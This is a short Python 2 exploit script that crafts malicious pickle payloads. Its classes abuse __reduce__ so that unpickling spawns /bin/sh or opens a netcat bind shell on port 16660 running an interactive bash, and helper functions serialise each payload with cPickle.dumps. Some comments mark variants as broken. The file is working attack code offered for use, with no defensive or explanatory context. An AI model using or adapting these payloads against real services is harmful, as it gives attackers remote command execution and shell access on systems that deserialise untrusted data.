import os
import subprocess
import cPickle

# Exploit that we want the target to unpickle
class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh',),))

#Broken =(
class Exploit2(object):
    def __reduce__(self):
        return (eval, ("subprocess.Popen, (['nc.traditional', "-l","-p","16660","-c","/bin/bash -i 2>&1"], True); [u'asd','8a7c2eac7d804571366e942316faa36c']" ,) )

class NonBlockBash(object):
    def __reduce__(self):
        return (subprocess.Popen, (['nc.traditional', "-l","-p","16660","-c","/bin/bash -i 2>&1"], True) )

#This won't work unless importable (use eval?)
class NonBlockBashWithReturn(list):
    def __init__(self):
        import subprocess
        import thread
        ignore = thread.start_new_thread(subprocess.Popen,(['nc.traditional', "-l","-p","16660","-c","/bin/bash -i 2>&1"], True))
        self.extend([u'asd','8a7c2eac7d804571366e942316faa36c'])

    def __reduce__(self):
        return (self.__class__, () )

class SayHi(object):
    def __reduce__(self):
        return (subprocess.Popen, (('echo','hi'),))

def getString():
    return cPickle.dumps(Exploit())

def getString2():
    return cPickle.dumps(Exploit2())

def nonBlockBashString():
    return cPickle.dumps(NonBlockBash())

def nonBlockBashWRString():
    return cPickle.dumps(NonBlockBashWithReturn())

def sayHiString():
    return cPickle.dumps(SayHi())

def getStringFor(cls):
    return cPickle.dumps(cls())